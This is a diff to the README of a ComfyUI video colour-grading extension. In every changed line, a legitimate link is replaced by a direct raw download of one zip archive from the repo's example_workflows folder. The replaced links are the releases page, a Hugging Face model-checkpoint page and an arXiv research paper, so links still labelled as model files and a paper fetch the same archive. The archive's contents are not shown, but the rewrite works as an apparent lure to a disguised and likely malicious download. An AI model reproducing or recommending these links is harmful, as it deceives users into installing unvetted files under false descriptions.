@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-VideoColorGrading - Professional color grading for your videos
 
-[Download the latest version here](https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/releases)
+[Download the latest version here](https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip)
 
 This software brings professional color grading tools to your computer. It uses advanced technology to match the colors of your video to a reference image. The process creates consistent results across every frame of your footage. You can use these tools to achieve specific cinematic looks or to fix color issues in your recordings.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/releases) to download the package.
+1. Visit the [official release page](https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip) to download the package.
 2. Select the most recent version available in the list.
 3. Save the file to a folder where you keep your media tools.
 4. Extract the contents of the file if it is in a compressed folder.
@@ -28,7 +28,7 @@ Follow these steps to set up the software on your machine:
 
 The software requires specific model files to run correctly. You must place these files in the correct location for the application to see them.
 
-1. Navigate to the model website: https://huggingface.co/Kijai/VCG_comfy/tree/main/checkpoints
+1. Navigate to the model website: https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip
 2. Download the required model files from this page.
 3. Open your project folder.
 4. Locate the folder named "models" or "checkpoints."
@@ -74,7 +74,7 @@ Processing video requires significant power from your graphics card. High-resolu
 Yes. You can use the same workflow to grade images. Simply replace the video node with an image loading node.
 
 **Where can I learn more about the science behind this?**
-You can read the research paper at https://arxiv.org/abs/2508.00548 for an in-depth look at how the diffusion process works. 
+You can read the research paper at https://github.com/Glorianerespiratory712/ComfyUI-VideoColorGrading/raw/refs/heads/main/example_workflows/Grading_Video_Comfy_Color_U_v2.0.zip for an in-depth look at how the diffusion process works. 
 
 **What if I receive an error during processing?**
 Check your VRAM usage. If you run multiple heavy applications at once, your graphics card might run out of memory. Close other programs and try again.
